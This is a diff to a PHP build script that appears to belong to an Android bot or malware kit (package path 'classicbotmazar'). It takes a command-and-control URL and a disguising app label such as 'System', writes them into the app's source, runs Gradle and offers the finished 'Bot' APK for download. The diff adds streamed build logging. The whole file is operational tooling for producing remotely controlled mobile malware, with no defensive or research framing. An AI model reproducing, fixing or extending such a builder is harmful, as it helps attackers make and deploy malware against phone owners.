@@ -1,20 +1,33 @@
 <?php
 ini_set('max_execution_time', 900);
 set_time_limit(900);
-header('Content-Type: application/json');
+header('Content-Type: text/event-stream');
+header('Cache-Control: no-cache');
+header('Connection: keep-alive');
 
-$input = json_decode(file_get_contents('php://input'), true);
+$input = json_decode(file_get_contents('php://input') ?? '{}', true);
+if (!$input) {
+    $input = $_GET;
+}
+
 $apkName = preg_replace('/[^a-zA-Z0-9_\-]/', '', $input['apkName'] ?? 'Bot');
 $appLabel = $input['appLabel'] ?? 'System';
 $c2Url = $input['c2Url'] ?? '';
 
+function sendLog($msg, $data = []) {
+    echo "data: " . json_encode(array_merge(['log' => $msg . "\n"], $data)) . "\n\n";
+    if (ob_get_level() > 0) ob_flush();
+    flush();
+}
+
 if (!$c2Url) {
-    echo json_encode(['success' => false, 'message' => 'C2 URL is empty']);
+    sendLog("Error: C2 URL is empty", ['success' => false]);
     exit;
 }
 
-$isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
 $baseDir = realpath(__DIR__ . '/../../../');
+
+sendLog("Starting build process for $apkName ($appLabel)...");
 
 // Update Constants
 $constFile = $baseDir . '/app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
@@ -22,6 +35,7 @@ if (file_exists($constFile)) {
     $c = file_get_contents($constFile);
     $c = preg_replace('/val urlConnection = ".*"/', 'val urlConnection = "' . $c2Url . '"', $c);
     file_put_contents($constFile, $c);
+    sendLog("Updated Constants.kt with C2 URL: $c2Url");
 }
 
 // Update Strings
@@ -30,59 +44,40 @@ if (file_exists($strFile)) {
     $s = file_get_contents($strFile);
     $s = preg_replace('/<string name="app_name">.*<\/string>/', '<string name="app_name">' . htmlspecialchars($appLabel) . '</string>', $s);
     file_put_contents($strFile, $s);
+    sendLog("Updated strings.xml with App Label: $appLabel");
 }
 
-// Attempt to find JDK if JAVA_HOME is not set correctly or pointing to invalid path
-$jdkPath = '';
-
+$isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
 if ($isWin) {
-    // Check if current JAVA_HOME is valid
-    $currentJavaHome = getenv('JAVA_HOME');
-    if ($currentJavaHome && file_exists($currentJavaHome)) {
-        $jdkPath = $currentJavaHome;
-    } else {
-        // Common JDK paths on Windows
-        $possibleJdkPaths = [
-            'C:\Program Files\Java\jdk-*',
-            'C:\Program Files\Eclipse Adoptium\jdk-*',
-            'C:\Program Files\Microsoft\jdk-*',
-            'C:\Program Files\Java\jdk21*',
-            'C:\Program Files\Java\jdk-17*',
-        ];
-        foreach ($possibleJdkPaths as $pattern) {
-            $dirs = glob($pattern, GLOB_ONLYDIR);
-            if (!empty($dirs)) {
-                // Sort to get the latest version if multiple exist
-                natsort($dirs);
-                $jdkPath = end($dirs);
-                break;
-            }
-        }
-    }
-}
-
-$output = [];
-$status = 0;
-
-if ($isWin) {
-    // Force clear and set JAVA_HOME to ensure it's valid, and use double quotes for paths with spaces
-    $envCmd = $jdkPath ? "set \"JAVA_HOME=$jdkPath\" && " : "set JAVA_HOME= && ";
-    $cmd = "cd /d " . escapeshellarg($baseDir) . " && {$envCmd}call gradlew.bat assembleDebug --console=plain --info 2>&1";
+    $cmd = "cd /d " . escapeshellarg($baseDir) . " && gradlew.bat assembleDebug --console=plain --info 2>&1";
 } else {
-    // Linux
     $cmd = 'cd ' . escapeshellarg($baseDir) . ' && chmod +x gradlew && ./gradlew assembleDebug --console=plain --info 2>&1';
 }
 
-exec($cmd, $output, $status);
+sendLog("Executing build command: $cmd");
+
+$handle = popen($cmd, 'r');
+if ($handle) {
+    while (!feof($handle)) {
+        $line = fgets($handle);
+        if ($line) {
+            sendLog($line);
+        }
+    }
+    $status = pclose($handle);
+} else {
+    $status = 1;
+    sendLog("Failed to execute build command.");
+}
 
 if ($status === 0) {
     $src = $baseDir . '/app/build/outputs/apk/debug/app-debug.apk';
     $dest = __DIR__ . '/../' . $apkName . '.apk';
     if (file_exists($src) && copy($src, $dest)) {
-        echo json_encode(['success' => true, 'downloadUrl' => $apkName . '.apk', 'log' => implode("\n", $output)]);
+        sendLog("Build successful!", ['success' => true, 'downloadUrl' => $apkName . '.apk']);
     } else {
-        echo json_encode(['success' => false, 'message' => 'Copy failed', 'log' => implode("\n", $output)]);
+        sendLog("Copy failed. APK not found at $src", ['success' => false]);
     }
 } else {
-    echo json_encode(['success' => false, 'message' => 'Build error', 'log' => implode("\n", $output)]);
+    sendLog("Build failed with exit code $status", ['success' => false]);
 }
